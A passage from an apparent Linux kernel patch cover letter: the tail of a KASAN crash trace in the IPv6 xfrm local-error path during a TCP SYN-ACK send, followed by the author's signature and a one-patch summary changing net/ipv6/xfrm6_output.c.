[  261.264174] [      C0]  __x64_sys_execve+0x8c/0xb0
[  261.264483] [      C0]  do_syscall_64+0xc7/0x270
[  261.264785] [      C0]  entry_SYSCALL_64_after_hwframe+0x77/0x7f

[  261.265320] [      C0] Memory state around the buggy address:
[  261.265683] [      C0]  ffff888113a78400: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[  261.266242] [      C0]  ffff888113a78480: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[  261.266764] [      C0] >ffff888113a78500: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[  261.267303] [      C0]                                                           ^
[  261.267807] [      C0]  ffff888113a78580: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[  261.268326] [      C0]  ffff888113a78600: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[  261.268872] [      C0] ==================================================================
[  261.269536] [      C0] Kernel panic - not syncing: KASAN: panic_on_warn set ...
[  261.270041] [      C0] CPU: 0 UID: 1028 PID: 10601 Comm: python3 Not tainted 6.12.95 #2
[  261.270552] [      C0] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  261.271357] [      C0] Call Trace:
[  261.271572] [      C0]  <IRQ>
[  261.271776] [      C0]  panic+0x533/0x610
[  261.272049] [      C0]  ? __pfx_panic+0x10/0x10
[  261.272342] [      C0]  ? irqentry_exit+0x3b/0x90
[  261.272665] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.273061] [      C0]  ? lockdep_hardirqs_on+0x7b/0x110
[  261.273403] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.273784] [      C0]  ? ipv6_local_error+0x3a/0x840
[  261.274136] [      C0]  ? ipv6_local_error+0x3a/0x840
[  261.274465] [      C0]  check_panic_on_warn+0x61/0x80
[  261.274993] [      C0]  end_report+0x11b/0x180
[  261.275296] [      C0]  kasan_report+0xe8/0x110
[  261.275583] [      C0]  ? ipv6_local_error+0x3a/0x840
[  261.275928] [      C0]  kasan_check_range+0xf4/0x1a0
[  261.276246] [      C0]  ipv6_local_error+0x3a/0x840
[  261.276561] [      C0]  xfrm6_local_error+0x1f6/0x2e0
[  261.276925] [      C0]  ? __pfx_xfrm6_local_error+0x10/0x10
[  261.277294] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.277660] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.278066] [      C0]  xfrm_local_error+0xed/0x1a0
[  261.278387] [      C0]  __xfrm6_output+0xa48/0xc50
[  261.278794] [      C0]  xfrm6_output+0x136/0x480
[  261.279108] [      C0]  ? __pfx_xfrm6_output+0x10/0x10
[  261.279439] [      C0]  ? trace_lock_acquire+0x145/0x1c0
[  261.279806] [      C0]  ? __pfx___xfrm6_output+0x10/0x10
[  261.280143] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.280530] [      C0]  ip6_xmit+0x1802/0x1c20
[  261.280826] [      C0]  ? __pfx___lock_acquire+0x10/0x10
[  261.281179] [      C0]  ? __pfx_ip6_xmit+0x10/0x10
[  261.281495] [      C0]  ? __pfx_lock_acquire.part.0+0x10/0x10
[  261.281869] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.282241] [      C0]  ? rcu_is_watching+0x12/0xc0
[  261.282559] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.282943] [      C0]  ? trace_lock_acquire+0x145/0x1c0
[  261.283290] [      C0]  ? tcp_v6_send_synack+0x4a5/0xcf0
[  261.283634] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.284056] [      C0]  tcp_v6_send_synack+0x5ae/0xcf0
[  261.284409] [      C0]  ? __pfx_tcp_v6_send_synack+0x10/0x10
[  261.284805] [      C0]  ? __pfx_inet_csk_reqsk_queue_hash_add+0x10/0x10
[  261.285228] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.285592] [      C0]  tcp_conn_request+0x1fec/0x35d0
[  261.285946] [      C0]  ? __pfx_tcp_conn_request+0x10/0x10
[  261.286294] [      C0]  ? __lock_acquire+0xc96/0x3c40
[  261.286614] [      C0]  ? lock_acquire.part.0+0x119/0x370
[  261.287003] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.287383] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.287761] [      C0]  ? tcp_rcv_state_process+0x3fc/0x5010
[  261.288119] [      C0]  tcp_rcv_state_process+0x3fc/0x5010
[  261.288476] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.288842] [      C0]  ? sk_filter_trim_cap+0x3fa/0x9a0
[  261.289183] [      C0]  ? __pfx_lock_release+0x10/0x10
[  261.289510] [      C0]  ? __pfx_tcp_rcv_state_process+0x10/0x10
[  261.289906] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.290374] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.290771] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.291143] [      C0]  ? sk_filter_trim_cap+0x404/0x9a0
[  261.291488] [      C0]  ? __pfx_tcp_inbound_hash+0x10/0x10
[  261.291945] [      C0]  ? tcp_v6_do_rcv+0x680/0x1430
[  261.292269] [      C0]  tcp_v6_do_rcv+0x680/0x1430
[  261.292619] [      C0]  ? __asan_memcpy+0x3c/0x60
[  261.292952] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.293368] [      C0]  tcp_v6_rcv+0x3064/0x39b0
[  261.293720] [      C0]  ? raw6_local_deliver+0x3b1/0x8a0
[  261.294104] [      C0]  ? __pfx_tcp_v6_rcv+0x10/0x10
[  261.294427] [      C0]  ? __pfx_raw6_local_deliver+0x10/0x10
[  261.294822] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.295186] [      C0]  ? lock_acquire.part.0+0x119/0x370
[  261.295548] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.295925] [      C0]  ip6_protocol_deliver_rcu+0x12c/0x1450
[  261.296286] [      C0]  ? trace_lock_acquire+0x145/0x1c0
[  261.296622] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5
[  261.297025] [      C0]  ? __pfx_ipv6_rcv+0x10/0x10
[  261.297336] [      C0]  ? process_backlog+0x38c/0x1400
[  261.297672] [      C0]  ip6_input_finish+0x11b/0x240
[  261.298038] [      C0]  ? ip6_input+0x78/0xb0
[  261.298339] [      C0]  __netif_receive_skb_one_core+0x11a/0x1b0
[  261.298780] [      C0]  ? __pfx___netif_receive_skb_one_core+0x10/0x10
[  261.299210] [      C0]  ? srso_alias_return_thunk+0x5/0xfbef5

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  ipv6: xfrm: use full sockets in local error paths

 net/ipv6/xfrm6_output.c | 10 ++++++++--
 1 file changed, 8 insertions(+), 2 deletions(-)

-- 
2.43.0
